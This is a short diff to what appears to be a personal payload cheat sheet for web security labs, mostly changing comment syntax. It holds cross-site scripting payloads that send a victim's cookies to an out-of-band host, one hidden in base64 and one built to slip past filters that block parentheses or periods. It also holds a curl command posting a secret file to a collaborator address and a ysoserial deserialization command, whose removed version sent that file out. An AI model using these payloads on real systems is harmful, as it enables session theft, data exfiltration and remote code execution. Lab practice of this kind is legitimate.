@@ -13,19 +13,19 @@
 # XSS
 
 ```js
--- No periods (.)
+\\ No periods (.)
 "-fetch(atob('aHR0cHM6Ly91cW8yODdieDV0OWppbWxidDJ3eXFqd3pjcWloNjd1dy5vYXN0aWZ5LmNvbQ=='), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})-"
 
--- No parentheses
+\\ No parentheses
 "-eval.call`${"fetch\x28'https://waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`-"
 ```
 
 # Code Injection
 ```bash
 
--- Curl file contents
+# Curl file contents
 curl -X POST <your-collaborator> -d @/home/carlos/secret
 
--- Gzip and base64 ysoserial
-java -jar ysoserial-all.jar CommonsBeanutils1 "curl -X POST https://k1msjxmngjk9tcw14s7o197pngt7hz5o.oastify.com/ -d @/home/carlos/secret" | gzip | base64 -w0
+# Gzip and base64 ysoserial
+java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
 ```
